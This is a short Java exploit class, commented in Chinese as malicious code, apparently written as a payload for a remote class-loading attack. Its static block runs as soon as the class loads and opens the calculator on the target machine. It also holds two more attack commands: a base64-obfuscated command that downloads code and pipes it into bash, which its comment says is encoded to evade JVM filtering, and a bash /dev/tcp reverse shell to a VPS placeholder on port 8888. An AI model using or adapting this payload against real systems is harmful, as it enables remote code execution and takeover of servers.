/**
 * @author zhaohj
 * @date 2021-12-11 21:07:50
 * @Description 恶意代码类
 */
public class Exploit {
    public Exploit() {
    }


    static {
        try {
            //在目标机器开启计算机
            String[] cmd1 = System.getProperty("os.name").toLowerCase().contains("win")
                    ? new String[]{"cmd.exe", "/c", "calc.exe"}
                    : new String[]{"/bin/bash", "-c", "open -a /Applications/Calculator.app"};
            //在目标机器执行shell 因为jvm有可能会过滤防御，对command base64编码
            String[] cmd2 = new String[]{"/bin/bash", "-c", " {echo,Y3VybCBodHRwOi8vcG9jL3Rhc3RlZ29vZA==}|{base64,-d}|{bash,-i}"};
            //一句话木马 借助一台 vps 来拿取服务运行后台的 shell 权限
            String[] cmd3 = new String[]{"/bin/bash", "-c", "bash -i >& /dev/tcp/<VPS IP>/8888 0>&1"};
            Runtime.getRuntime().exec(cmd1);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        Exploit e = new Exploit();
    }
}